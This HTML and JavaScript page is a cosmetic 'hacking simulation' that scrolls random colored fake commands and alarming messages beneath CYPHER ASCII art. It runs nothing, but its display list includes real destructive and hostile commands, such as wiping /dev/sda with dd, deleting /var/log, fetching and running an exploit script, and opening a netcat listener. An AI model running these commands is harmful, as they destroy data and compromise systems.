<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacking Simulation</title>
    <style>
        body {
            background-color: #000;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.2;
            margin: 0;
            padding: 0;
            overflow: hidden;
            height: 100vh;
        }
        #console {
            white-space: pre;
            padding: 10px;
            overflow-y: scroll;
            height: 100%;
            box-sizing: border-box;
        }
        #console::-webkit-scrollbar {
            display: none;
        }
        .cypher { 
            color: #ff0000; 
            font-size: 12px; /* Adjusted font size for smaller appearance */
            font-weight: bold; 
        }
        .green { color: #00ff00; }
        .red { color: #ff5555; }
        .yellow { color: #ffff00; }
        .blue { color: #0000ff; }
        .cyan { color: #00ffff; }
        .orange { color: #ffa500; }
    </style>
</head>
<body>
    <div id="console"></div>

    <script>
        const consoleDiv = document.getElementById('console');
        const MAX_LINES = 200; // Limit lines to avoid clutter
        const TOTAL_LINES = 100; // Total lines to simulate before completing

        // Updated ASCII Art for CYPHER
        const cypherArt = `

─██░░░░░░░░░░██─██░░░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
─██░░██████████─████░░██──██░░████─██░░██████░░██─██░░██──██░░██─██░░██████████─██░░████████░░██───
─██░░██───────────██░░░░██░░░░██───██░░██──██░░██─██░░██──██░░██─██░░██─────────██░░██────██░░██───
─██░░██───────────████░░░░░░████───██░░██████░░██─██░░██████░░██─██░░██████████─██░░████████░░██───
─██░░██─────────────████░░████─────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
─██░░██───────────────██░░██───────██░░██████████─██░░██████░░██─██░░██████████─██░░██████░░████───
─██░░██───────────────██░░██───────██░░██─────────██░░██──██░░██─██░░██─────────██░░██──██░░██─────
─██░░██████████───────██░░██───────██░░██─────────██░░██──██░░██─██░░██████████─██░░██──██░░██████─
─██░░░░░░░░░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░░░░░░░░░██─██░░██──██░░░░░░██─
─██████████████───────██████───────██████─────────██████──██████─██████████████─██████──██████████─
───────────────────────────────────────────────────────────────────────────────────────────────────
        `;

        function printCypherArt() {
            // Directly append the entire ASCII art at once
            consoleDiv.innerHTML += `<span class="cypher">${cypherArt}</span>\n`;
            consoleDiv.scrollTop = consoleDiv.scrollHeight;

            // Start hacking simulation after ASCII art
            setTimeout(startHackingSimulation, 500); // 0.5 seconds delay before starting the simulation
        }

        // Generate random Linux commands with indentation
        function generateLinuxCommand() {
            const commands = [
                'curl -s http://site | tar xz',
                'wget http://site -O /tmp/exploit.sh',
                'chmod +x /tmp/exploit.sh',
                '/tmp/exploit.sh',
                'find / -name "*.log"',
                'nc -lvp 4444',
                'ssh user@host "cat /etc/passwd"',
                'echo "code" >> /etc/rc.local',
                'dd if=/dev/zero of=/dev/sda bs=1M count=1',
                'rm -rf /var/log/*',
                'tar -cvf archive.tar /path/',
                'gzip -c file.txt > file.txt.gz',
                'openssl enc -aes-256-cbc -in file.txt -out file.txt.enc',
                'md5sum file.txt',
                'sha256sum file.txt',
                'df -h',
                'top -n 1',
                'ps aux | grep process',
                'lsof -i :80',
                'netstat -tuln',
                'grep -r "pattern" /path/'
            ];
            return commands[Math.floor(Math.random() * commands.length)];
        }

        // Generate random frightening English texts with varying colors
        function generateMessage() {
            const messages = [
                'Initiating SQL Injection Attack...',
                'Overwriting system files...',
                'Accessing root privileges...',
                'Establishing backdoor access...',
                'Bypassing firewall protections...',
                'Decrypting sensitive data...',
                'Compromising user credentials...',
                'Injecting malicious payload...',
                'Clearing log files...',
                'Executing remote code...',
                'Disabling security protocols...',
                'Scanning for vulnerabilities...',
                'Spreading ransomware...',
                'Injecting exploit into kernel...',
                'Modifying system configurations...'
            ];
            return messages[Math.floor(Math.random() * messages.length)];
        }

        // Generate random lines of code or messages with varying indentation and color
        function generateLine() {
            const indentations = ['    ', '        ', '            ']; // Different levels of indentation
            const indentation = indentations[Math.floor(Math.random() * indentations.length)];
            const isCode = Math.random() < 0.7; // 70% chance for code, 30% for message
            
            let lineContent;
            if (isCode) {
                lineContent = `${indentation}${generateLinuxCommand()}`;
            } else {
                lineContent = `${indentation}${generateMessage()}`;
            }

            // Color selection logic: 60% green, 20% red, 10% yellow, 10% cyan
            const randomFactor = Math.random();
            let colorClass = 'green'; // Default color

            if (randomFactor < 0.2) {
                colorClass = 'red'; // 20% chance for red
            } else if (randomFactor < 0.3) {
                colorClass = 'yellow'; // 10% chance for yellow
            } else if (randomFactor < 0.4) {
                colorClass = 'cyan'; // 10% chance for cyan
            }

            return `<span class="${colorClass}">${lineContent}</span>`;
        }

        // Add a new line to the console with weighted random intervals
        function addLine() {
            const lineContent = `${generateLine()}\n`;
            consoleDiv.innerHTML += lineContent;

            // Smooth scrolling effect
            consoleDiv.scrollTop = consoleDiv.scrollHeight;

            // Limit the number of lines displayed
            if (consoleDiv.childNodes.length > MAX_LINES) {
                consoleDiv.removeChild(consoleDiv.firstChild);
            }

            // Weighted interval between 30ms and 500ms
            const randomFactor = Math.random();
            let delay;

            if (randomFactor < 0.7) { // 70% chance for a very short interval
                delay = Math.random() * 30 + 30; // 30ms to 60ms
            } else if (randomFactor < 0.9) { // 20% chance for a short interval
                delay = Math.random() * 150 + 60; // 60ms to 210ms
            } else { // 10% chance for a longer interval
                delay = Math.random() * 300 + 210; // 210ms to 510ms
            }

            // Stop adding lines after TOTAL_LINES
            if (consoleDiv.childNodes.length >= TOTAL_LINES) {
                setTimeout(() => {
                    consoleDiv.innerHTML += `<span class="green">[SYSTEM] Full access granted. Hijack complete.</span>\n`;
                    consoleDiv.scrollTop = consoleDiv.scrollHeight;
                }, delay);
            } else {
                setTimeout(addLine, delay);
            }
        }

        // Start the hacking simulation
        function startHackingSimulation() {
            addLine(); // Start adding lines to the console
        }

        // Initialize the console with ASCII art
        printCypherArt();
    </script>
</body>
</html>
